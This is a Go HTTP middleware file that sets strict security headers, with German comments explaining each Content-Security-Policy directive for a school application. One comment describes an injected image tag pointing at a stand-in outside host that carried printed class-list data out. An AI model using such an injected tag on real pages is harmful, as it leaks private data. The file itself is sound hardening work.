package middleware

import (
	"net/http"
)

// SecurityHeadersMiddleware adds strict security headers to all responses.
// This includes Content-Security-Policy (CSP) restricted to 'self',
// X-Content-Type-Options, X-Frame-Options, X-XSS-Protection,
// Referrer-Policy, and Permissions-Policy.
func SecurityHeadersMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("X-Content-Type-Options", "nosniff")
		w.Header().Set("X-Frame-Options", "DENY")
		w.Header().Set("X-XSS-Protection", "1; mode=block")

		// CSP so eng wie möglich auf 'self'.
		//
		// base-uri 'self' — NEU, und keine Kosmetik: base-uri fällt NICHT auf default-src
		// zurück. Ohne die Direktive kann ein einziges eingeschleustes <base href="…">
		// jede relative URL der Seite umbiegen, also auch die Formularziele und
		// API-Aufrufe der SPA. Die Direktive kostet nichts, weil die Anwendung selbst
		// kein <base> setzt.
		//
		// object-src 'none' — <object>/<embed> kommen im Frontend nirgends vor
		// (verifiziert), und Plugin-Inhalte sind ein klassischer Umgehungsweg für
		// script-src. Explizit verbieten statt über default-src erben.
		//
		// style-src behält 'unsafe-inline', und das ist eine bewusste Entscheidung, kein
		// Versäumnis: Das Frontend setzt an 30 Stellen inline style-Attribute, 12 davon
		// mit interpolierten Werten (z. B. der Ausweis-Designer: style="left: {el.x}mm").
		// Ein Nonce hilft dort nicht — Nonces gelten für <style>-ELEMENTE, nicht für
		// style-ATTRIBUTE. 'unsafe-hashes' scheidet ebenso aus, weil sich der Hash eines
		// interpolierten Werts bei jedem Rendern ändert. Die Direktive lässt sich also
		// nur nach einem Umbau aller dynamischen Positionierungen auf CSS-Variablen
		// entfernen; bis dahin wäre jede Änderung hier ein kaputter Designer.
		//
		// img-src OHNE https: — seit dem 06.08.2026, und das war eine Änderung am
		// Frontend, nicht nur an dieser Zeile.
		//
		// Das pauschale https: erlaubte Bilder von JEDEM fremden Server. Gemessen wurde,
		// was das wert ist: Ein aus Stammdaten eingeschleustes
		// <img src="https://fremder-host/?daten=…"> im Druckfenster lud anstandslos und
		// trug den Inhalt der gedruckten Klassenliste nach draußen — Skripte blockiert die
		// Richtlinie, Bilder waren der offene Weg.
		//
		// Gebraucht wurde https: von sieben Ansichten, die Cover direkt bei Google Books
		// und OpenLibrary holten. Das war ohnehin die falsche Bauweise: Es meldete den
		// Browser jeder Lehrkraft bei einem Dritten an und gab preis, welche ISBNs die
		// Schule gerade ansieht. Alle sieben laufen jetzt über den eigenen Cover-Proxy
		// (frontend/src/lib/utils/coverSrc.js, Allowlist in api/image_caching.go) — die
		// Bilder kommen unverändert an, nur eben vom eigenen Server.
		//
		// data: und blob: bleiben: erzeugte Barcodes/QR-Codes und Datei-Vorschauen vor
		// dem Hochladen.
		//
		// style-src behält 'unsafe-inline' (Begründung oben), script-src bleibt 'self'.
		w.Header().Set("Content-Security-Policy", "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; font-src 'self'; img-src 'self' data: blob:; connect-src 'self'; frame-ancestors 'none'; form-action 'self'; base-uri 'self'; object-src 'none';")

		w.Header().Set("Strict-Transport-Security", "max-age=31536000; includeSubDomains")
		w.Header().Set("Referrer-Policy", "strict-origin-when-cross-origin")

		// Feature-Policy is deprecated, using Permissions-Policy
		// Allow camera for barcode scanning
		w.Header().Set("Permissions-Policy", "geolocation=(), microphone=(), camera=(self)")

		next.ServeHTTP(w, r)
	})
}
